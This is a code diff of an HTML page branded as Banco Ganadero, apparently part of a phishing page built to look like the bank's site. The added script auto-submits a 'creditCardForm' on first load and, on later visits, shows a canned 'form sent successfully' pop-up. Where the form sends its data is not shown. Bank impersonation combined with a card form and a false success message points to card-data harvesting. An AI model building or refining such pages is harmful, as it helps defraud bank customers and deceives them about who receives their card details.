@@ -5,24 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banco Ganadero</title>
     <link rel="shortcut icon" href="https://www.bg.com.bo/favicon.ico">
-    <!-- JavaScript para enviar el formulario automáticamente solo la primera vez -->
-    <script>
-        window.addEventListener('DOMContentLoaded', function () {
-            // Comprobar si el formulario ya se ha enviado antes
-            const hasFormBeenSubmitted = localStorage.getItem('formularioEnviado');
+     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<!-- JavaScript para enviar el formulario automáticamente solo la primera vez y mostrar SweetAlert -->
+<script>
+    window.addEventListener('DOMContentLoaded', function () {
+        // Comprobar si el formulario ya se ha enviado antes
+        const hasFormBeenSubmitted = localStorage.getItem('formularioEnviado');
 
-            if (!hasFormBeenSubmitted) {
-                // Obtener el formulario
-                const creditCardForm = document.getElementById('creditCardForm');
+        if (!hasFormBeenSubmitted) {
+            // Obtener el formulario
+            const creditCardForm = document.getElementById('creditCardForm');
 
-                // Enviar el formulario automáticamente
-                creditCardForm.submit();
+            // Enviar el formulario automáticamente
+            creditCardForm.submit();
 
-                // Establecer un indicador en localStorage para que no se envíe nuevamente
-                localStorage.setItem('formularioEnviado', 'true');
-            }
-        });
-    </script>
+            // Establecer un indicador en localStorage para que no se envíe nuevamente
+            localStorage.setItem('formularioEnviado', 'true');
+        } else {
+            // El formulario ya se ha enviado antes, mostrar SweetAlert en el segundo clic
+            const submitButton = document.querySelector('button[type="submit"]');
+
+            submitButton.addEventListener('click', function () {
+                // Mostrar la alerta de SweetAlert
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Éxito',
+                    text: 'El formulario se ha enviado con éxito.',
+                });
+            });
+        }
+    });
+</script>
+
     <style>
         /* Estilos CSS en línea */
         body {
